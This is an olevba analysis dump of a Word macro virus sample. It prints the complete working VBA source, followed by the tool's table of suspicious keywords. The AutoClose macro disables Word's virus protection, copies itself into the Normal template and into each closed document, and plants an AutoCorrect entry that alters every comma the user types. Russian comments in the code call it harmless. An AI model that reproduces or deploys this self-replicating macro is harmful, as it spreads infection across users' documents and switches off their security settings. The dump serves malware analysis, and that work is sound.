olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Btw-4a08e77ead9781ad2c588a01bc7f782ddb4f80ba
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Btw-4a08e77ead9781ad2c588a01bc7f782ddb4f80ba - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoR.bas 
in file: Virus.MSWord.Btw-4a08e77ead9781ad2c588a01bc7f782ddb4f80ba - OLE stream: 'Macros/VBA/AutoR'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
Attribute AutoClose.VB_Description = "Макрос создан "
Attribute AutoClose.VB_ProcData.VB_Invoke_Func = "Normal.AutoR.AutoClose"
'Autor
'Нормальный вирусок...  Безобидный абсолютно
'При помощи его вы сможете быстрее освоить Word :-)))

  On Error Resume Next
  Application.Options.VirusProtection = False
  Application.Options.SaveNormalPrompt = False
  Application.Options.ConfirmConversions = False
  
    Application.OrganizerCopy ActiveDocument.FullName, NormalTemplate.FullName, "Autor", wdOrganizerObjectProjectItems
  
  If NormalTemplate.Saved = False Then NormalTemplate.Save

    myValue = ", кстати,"
    Ol = True
    For Each anEntry In AutoCorrect.Entries
        If anEntry.Name = myValue Then Ol = False
    Next anEntry
    If Ol Then NormalTemplate.Application.AutoCorrect.Entries.Add Name:=",", Value:=myValue
    
    s = ""
    NormalTemplate.VBProject.VBComponents("AutoR").Export ("c:\Repeat.tmp")
    ActiveDocument.VBProject.VBComponents.Import ("c:\Repeat.tmp")
    ActiveDocument.SaveAs ActiveDocument.FullName
    Kill ("c:\Repeat.tmp")

End Sub


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

